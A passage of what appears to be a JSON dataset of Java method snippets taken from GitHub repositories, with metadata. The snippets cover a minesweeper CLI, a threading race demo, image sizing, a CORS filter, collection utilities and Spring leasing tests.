"https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "cls", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void cls() {\t\tfor (int i = 0; i < 50; i++) {\t\t\tSystem.out.println();\t\t}\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "registerRevealCallback", "params": ["UiCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void registerRevealCallback(UiCallback callback) {\t\treveal = callback; //reference to callback as a field\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "registerMarkCallback", "params": ["UiCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void registerMarkCallback(UiCallback callback) {\t\tmark = callback; //reference to callback as a field\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "registerNewGameCallback", "params": ["UiCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void registerNewGameCallback(UiCallback callback) {\t\tnewGame = callback; //reference to callback as a field\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void run() {    for (int i = 0; i < 2_000_000; i++) {      value++;    }  }", "url": "https://raw.githubusercontent.com/SimonHGR/safari-threads/master/src/main/java/runnables/BadCounter.java", "stars": "3", "class": {"name": "Value", "extends": null, "implements": ["Runnable"], "modifiers": []}}, {"method_name": "main", "params": ["String"], "throws": ["Throwable"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(String[] args) throws Throwable {    Value v = new Value();//    v.run();//    v.run();    Thread t1 = new Thread(v);    t1.start();    Thread t2 = new Thread(v);    t2.start();//    Thread.sleep(3000);    t1.join(); // Handles timing    t2.join();    System.out.println(\"Value of v.value is \" + v.value);  }", "url": "https://raw.githubusercontent.com/SimonHGR/safari-threads/master/src/main/java/runnables/BadCounter.java", "stars": "3", "class": {"name": "BadCounter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setupExecutors", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setupExecutors() throws ExecutorManagerException {    final ImmutableSet<Executor> newExecutors = loadExecutors();    if (newExecutors.isEmpty()) {      final String error = \"No active executors found\";      logger.error(error);      throw new ExecutorManagerException(error);    } else {      this.activeExecutors = newExecutors;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ActiveExecutors.java", "stars": "18", "class": {"name": "ActiveExecutors", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<Executor>", "snippet": "  public Collection<Executor> getAll() {    return this.activeExecutors;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ActiveExecutors.java", "stars": "18", "class": {"name": "ActiveExecutors", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "loadExecutors", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "ImmutableSet<Executor>", "snippet": "  private ImmutableSet<Executor> loadExecutors() throws ExecutorManagerException {    logger.info(\"Initializing executors from database.\");    return ImmutableSet.copyOf(this.executorLoader.fetchActiveExecutors());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ActiveExecutors.java", "stars": "18", "class": {"name": "ActiveExecutors", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "description", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description() {        return abstractCake.description();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/decorate/example/AbstractDecorate.java", "stars": "2", "class": {"name": "AbstractDecorate", "extends": "AbstractCake", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "calculatePrice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int calculatePrice() {        return abstractCake.calculatePrice();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/decorate/example/AbstractDecorate.java", "stars": "2", "class": {"name": "AbstractDecorate", "extends": "AbstractCake", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "defineTargetSizeForView", "params": ["ImageView", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "ImageSize", "snippet": "\tpublic static ImageSize defineTargetSizeForView(ImageView imageView, int maxImageWidth, int maxImageHeight) {\t\tfinal DisplayMetrics displayMetrics = imageView.getContext().getResources().getDisplayMetrics();\t\tfinal LayoutParams params = imageView.getLayoutParams();\t\tint width = (params != null && params.width == LayoutParams.WRAP_CONTENT) ? 0 : imageView.getWidth(); // Get actual image width\t\tif (width <= 0 && params != null) width = params.width; // Get layout width parameter\t\tif (width <= 0) width = getImageViewFieldValue(imageView, \"mMaxWidth\"); // Check maxWidth parameter\t\tif (width <= 0) width = maxImageWidth;\t\tif (width <= 0) width = displayMetrics.widthPixels;\t\tint height = (params != null && params.height == LayoutParams.WRAP_CONTENT) ? 0 : imageView.getHeight(); // Get actual image height\t\tif (height <= 0 && params != null) height = params.height; // Get layout height parameter\t\tif (height <= 0) height = getImageViewFieldValue(imageView, \"mMaxHeight\"); // Check maxHeight parameter\t\tif (height <= 0) height = maxImageHeight;\t\tif (height <= 0) height = displayMetrics.heightPixels;\t\treturn new ImageSize(width, height);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/utils/ImageSizeUtils.java", "stars": "74", "class": {"name": "ImageSizeUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getImageViewFieldValue", "params": ["Object", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "int", "snippet": "\tprivate static int getImageViewFieldValue(Object object, String fieldName) {\t\tint value = 0;\t\ttry {\t\t\tField field = ImageView.class.getDeclaredField(fieldName);\t\t\tfield.setAccessible(true);\t\t\tint fieldValue = (Integer) field.get(object);\t\t\tif (fieldValue > 0 && fieldValue < Integer.MAX_VALUE) {\t\t\t\tvalue = fieldValue;\t\t\t}\t\t} catch (Exception e) {\t\t\tL.e(e);\t\t}\t\treturn value;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/utils/ImageSizeUtils.java", "stars": "74", "class": {"name": "ImageSizeUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "computeImageSampleSize", "params": ["ImageSize", "ImageSize", "ViewScaleType", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int computeImageSampleSize(ImageSize srcSize, ImageSize targetSize, ViewScaleType viewScaleType, boolean powerOf2Scale) {\t\tint srcWidth = srcSize.getWidth();\t\tint srcHeight = srcSize.getHeight();\t\tint targetWidth = targetSize.getWidth();\t\tint targetHeight = targetSize.getHeight();\t\tint scale = 1;\t\tint widthScale = srcWidth / targetWidth;\t\tint heightScale = srcHeight / targetHeight;\t\tswitch (viewScaleType) {\t\t\tcase FIT_INSIDE:\t\t\t\tif (powerOf2Scale) {\t\t\t\t\twhile (srcWidth / 2 >= targetWidth || srcHeight / 2 >= targetHeight) { // ||\t\t\t\t\t\tsrcWidth /= 2;\t\t\t\t\t\tsrcHeight /= 2;\t\t\t\t\t\tscale *= 2;\t\t\t\t\t}\t\t\t\t} else {\t\t\t\t\tscale = Math.max(widthScale, heightScale); // max\t\t\t\t}\t\t\t\tbreak;\t\t\tcase CROP:\t\t\t\tif (powerOf2Scale) {\t\t\t\t\twhile (srcWidth / 2 >= targetWidth && srcHeight / 2 >= targetHeight) { // &&\t\t\t\t\t\tsrcWidth /= 2;\t\t\t\t\t\tsrcHeight /= 2;\t\t\t\t\t\tscale *= 2;\t\t\t\t\t}\t\t\t\t} else {\t\t\t\t\tscale = Math.min(widthScale, heightScale); // min\t\t\t\t}\t\t\t\tbreak;\t\t}\t\tif (scale < 1) {\t\t\tscale = 1;\t\t}\t\treturn scale;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/utils/ImageSizeUtils.java", "stars": "74", "class": {"name": "ImageSizeUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "computeImageScale", "params": ["ImageSize", "ImageSize", "ViewScaleType", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "\tpublic static float computeImageScale(ImageSize srcSize, ImageSize targetSize, ViewScaleType viewScaleType, boolean stretch) {\t\tint srcWidth = srcSize.getWidth();\t\tint srcHeight = srcSize.getHeight();\t\tint targetWidth = targetSize.getWidth();\t\tint targetHeight = targetSize.getHeight();\t\tfloat widthScale = (float) srcWidth / targetWidth;\t\tfloat heightScale = (float) srcHeight / targetHeight;\t\tint destWidth;\t\tint destHeight;\t\tif ((viewScaleType == ViewScaleType.FIT_INSIDE && widthScale >= heightScale) || (viewScaleType == ViewScaleType.CROP && widthScale < heightScale)) {\t\t\tdestWidth = targetWidth;\t\t\tdestHeight = (int) (srcHeight / widthScale);\t\t} else {\t\t\tdestWidth = (int) (srcWidth / heightScale);\t\t\tdestHeight = targetHeight;\t\t}\t\tfloat scale = 1;\t\tif ((!stretch && destWidth < srcWidth && destHeight < srcHeight) || (stretch && destWidth != srcWidth && destHeight != srcHeight)) {\t\t\tscale = (float) destWidth / srcWidth;\t\t}\t\treturn scale;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/utils/ImageSizeUtils.java", "stars": "74", "class": {"name": "ImageSizeUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "filter", "params": ["ServerWebExchange", "WebFilterChain"], "throws": null, "modifiers": ["public"], "return_type": "Mono<Void>", "snippet": "    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {        if(open){            ServerHttpResponse response = exchange.getResponse();            ServerHttpRequest request = exchange.getRequest();            HttpHeaders headers = response.getHeaders();            headers.add(\"Access-Control-Allow-Origin\", origin);            headers.add(\"Access-Control-Allow-Methods\", \"POST,GET,OPTIONS,DELETE,PUT,GET\");            headers.add(\"Access-Control-Max-Age\", \"3600\");            headers.add(\"Access-Control-Allow-Headers\", \"x-requested-with,Content-Type,Origin\");            headers.add(\"Access-Control-Allow-Credentials\", \"true\");            if(exchange.getRequest().getMethod() == HttpMethod.OPTIONS){                if(LOG.isDebugEnabled()){                    LOG.debug(\"Get HttpMethod 'OPTIONS', enable Cross-Domain\");                }                response.setStatusCode(HttpStatus.OK);                return Mono.empty();            }        }        return chain.filter(exchange);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/gateway/src/main/java/com/webank/wedatasphere/exchangis/gateway/filters/CorsGatewayFilter.java", "stars": "23", "class": {"name": "CorsGatewayFilter", "extends": null, "implements": ["WebFilter"], "modifiers": ["public"]}}, {"method_name": "readLock", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "ReentrantReadWriteLock", "snippet": "  protected ReentrantReadWriteLock.ReadLock readLock() {    return this.readWriteLock.readLock();  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/AbstractFactory.java", "stars": "2", "class": {"name": "AbstractFactory", "extends": null, "implements": ["ApexFactory"], "modifiers": ["public", "abstract"]}}, {"method_name": "writeLock", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "ReentrantReadWriteLock", "snippet": "  protected ReentrantReadWriteLock.WriteLock writeLock() {    return this.readWriteLock.writeLock();  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/AbstractFactory.java", "stars": "2", "class": {"name": "AbstractFactory", "extends": null, "implements": ["ApexFactory"], "modifiers": ["public", "abstract"]}}, {"method_name": "combine", "params": ["List<T>", "T"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "\tpublic static <T> List<T> combine(List<T> src, T additional) {\t\tList<T> list = new ArrayList<>(src);\t\tlist.add(additional);\t\treturn list;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/CollectUtils.java", "stars": "12", "class": {"name": "CollectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "combine", "params": ["List<T>", "List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "\tpublic static <T> List<T> combine(List<T> src1, List<T> src2) {\t\tList<T> list = new ArrayList<>(src1);\t\tlist.addAll(src2);\t\treturn list;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/CollectUtils.java", "stars": "12", "class": {"name": "CollectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "combine", "params": ["List<T>", "List<T>", "T"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "\tpublic static <T> List<T> combine(List<T> src1, List<T> src2, T additional) {\t\treturn combine(combine(src1, src2), additional);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/CollectUtils.java", "stars": "12", "class": {"name": "CollectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "distinct", "params": ["List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "\tpublic static <T> List<T> distinct(List<T> src) {\t\tList<T> copy = new ArrayList<>();\t\tfor(T t : src) {\t\t\tif (copy.contains(t))\t\t\t\tcontinue;\t\t\tcopy.add(t);\t\t}\t\treturn copy;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/CollectUtils.java", "stars": "12", "class": {"name": "CollectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return msg;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String msg) {        this.msg = msg;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCode() {        return code;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(int code) {        this.code = code;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getData() {        return data;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setData", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(T data) {        this.data = data;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"BaseResult{\" +                \"msg='\" + msg + '\\'' +                \", code=\" + code +                \", data=\" + data +                '}';    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/BaseResult.java", "stars": "1", "class": {"name": "BaseResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initDatabase", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void initDatabase() throws Exception {        try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/enumtypehandler_on_map/ibatisConfig.xml\")) {            sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);        }        BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),                \"org/apache/ibatis/submitted/enumtypehandler_on_map/CreateDB.sql\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/enumtypehandler_on_map/EnumTypeHandlerTest.java", "stars": "15", "class": {"name": "EnumTypeHandlerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testEnumWithParam", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testEnumWithParam() {        try (SqlSession sqlSession = sqlSessionFactory.openSession() ) {            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);            List<Person> persons = personMapper.getByType(Person.Type.PERSON, \"\");            Assertions.assertNotNull(persons, \"Persons must not be null\");            Assertions.assertEquals(1, persons.size(), \"Persons must contain exactly 1 person\");        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/enumtypehandler_on_map/EnumTypeHandlerTest.java", "stars": "15", "class": {"name": "EnumTypeHandlerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testEnumWithoutParam", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testEnumWithoutParam() {        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);            List<Person> persons = personMapper.getByTypeNoParam(new TypeName() {                @Override                public String getName() {                    return \"\";                }                @Override                public Type getType() {                    return Person.Type.PERSON;                }            });            Assertions.assertNotNull(persons, \"Persons must not be null\");            Assertions.assertEquals(1, persons.size(), \"Persons must contain exactly 1 person\");        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/enumtypehandler_on_map/EnumTypeHandlerTest.java", "stars": "15", "class": {"name": "EnumTypeHandlerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "drawScreen", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mouseX, int mouseY, float partialTicks) {        drawDefaultBackground();        super.drawScreen(mouseX, mouseY, partialTicks);        renderHoveredToolTip(mouseX, mouseY);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemMatrix/GuiMatrix.java", "stars": "2", "class": {"name": "GuiMatrix", "extends": "GuiContainer", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawGuiContainerBackgroundLayer", "params": ["float", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void drawGuiContainerBackgroundLayer(float partialTicks, int mouseX, int mouseY) {        GlStateManager.color(1.0f, 1.0f, 1.0f, 1.0f);        mc.getTextureManager().bindTexture(MATRIX_GUI_TEXTURE);        int i = (this.width - this.xSize) / 2;        int j = (this.height - this.ySize) / 2;        this.drawTexturedModalRect(i, j, 0, 0, this.xSize, this.rows * 18 + 35);        this.drawTexturedModalRect(i, j + this.rows * 18 + 17, 0, 89, this.xSize, 116);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemMatrix/GuiMatrix.java", "stars": "2", "class": {"name": "GuiMatrix", "extends": "GuiContainer", "implements": null, "modifiers": ["public"]}}, {"method_name": "initJobLogger", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Logger", "snippet": "  public static Logger initJobLogger() {    Logger rootLogger = Logger.getRootLogger();    rootLogger.removeAllAppenders();    ConsoleAppender appender = new ConsoleAppender(new PatternLayout(\"%p %m\\n\"));    appender.activateOptions();    rootLogger.addAppender(appender);    return rootLogger;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/javautils/JobUtils.java", "stars": "18", "class": {"name": "JobUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTemplatePath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTemplatePath() {        if(Objects.isNull(type)){            return layout + \".html\";        }        return type + \"/\" + layout + \".html\";    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/core/Context.java", "stars": "2", "class": {"name": "Context", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {        MockitoAnnotations.initMocks(this);        final LeasingController leasingController = new LeasingController(leasingService, leasingQueryService);        this.restLeasingMockMvc = MockMvcBuilders.standaloneSetup(leasingController)            .setCustomArgumentResolvers(pageableArgumentResolver)            .setControllerAdvice(exceptionTranslator)            .setConversionService(createFormattingConversionService())            .setMessageConverters(jacksonMessageConverter)            .setValidator(validator).build();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {        createRequester();        createOwner();        createOtherUser();        gardenField = new GardenField();        gardenField.setName(GARDEN_NAME);        gardenField.setSizeInM2(SIZE_IN_M2);        gardenField.setPricePerM2(PRICE_PER_M2);        gardenField.setLatitude(LATITUDE);        gardenField.setLongitude(LONGITUDE);        gardenField.setCity(CITY);        gardenField.setRoofed(ROOFED);        gardenField.setGlassHouse(GLASS_HOUSE);        gardenField.setHigh(HIGH);        gardenField.setWater(WATER);        gardenField.setElectricity(ELECTRICITY);        gardenField.setPhValue(PH_VALUE);        gardenField.setOwner(owner);        gardenFieldRepository.saveAndFlush(gardenField);        leasing = new Leasing()            .from(DEFAULT_FROM)            .to(DEFAULT_TO)            .status(DEFAULT_STATUS)            .gardenField(gardenField)            .paymentSessionId(\"test\")            .user(requester);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPaymentSessionId", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getPaymentSessionId() {        return paymentService.createCheckoutSession(creatorLeasingMapper.toDto(leasing)).getId();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateNonExistingLeasing", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateNonExistingLeasing() throws Exception {        int databaseSizeBeforeUpdate = leasingRepository.findAll().size();        // Create the Leasing        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        // If the entity doesn't have an ID, it will throw BadRequestAlertException        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isBadRequest());        // Validate the Leasing in the database        List<Leasing> leasingList = leasingRepository.findAll();        assertThat(leasingList).hasSize(databaseSizeBeforeUpdate);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingInNotAllowedPeriodByRequester", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingInNotAllowedPeriodByRequester() throws Exception {        leasing.setFrom(Instant.now().plus(13, ChronoUnit.DAYS)); //depends on UPDATE_DAY_RANGE in leasingService        leasing.setTo(Instant.now().plus(200, ChronoUnit.DAYS));        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.CANCELLED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isConflict());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingInNotAllowedPeriodByOwner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingInNotAllowedPeriodByOwner() throws Exception {        leasing.setFrom(Instant.now().plus(13, ChronoUnit.DAYS)); //depends on UPDATE_DAY_RANGE in leasingService        leasing.setTo(Instant.now().plus(200, ChronoUnit.DAYS));        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.RESERVED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isConflict());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingNotAllowedFromReservedToRejectedByOwner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingNotAllowedFromReservedToRejectedByOwner() throws Exception {        leasing.setStatus(LeasingStatus.RESERVED);        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.REJECTED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isConflict());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingNotAllowedFromCancelledToReservedByOwner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingNotAllowedFromCancelledToReservedByOwner() throws Exception {        leasing.setStatus(LeasingStatus.CANCELLED);        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.RESERVED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isConflict());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingNotAllowedFromOpenToReservedByRequester", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingNotAllowedFromOpenToReservedByRequester() throws Exception {        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.RESERVED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isConflict());    }", "url": 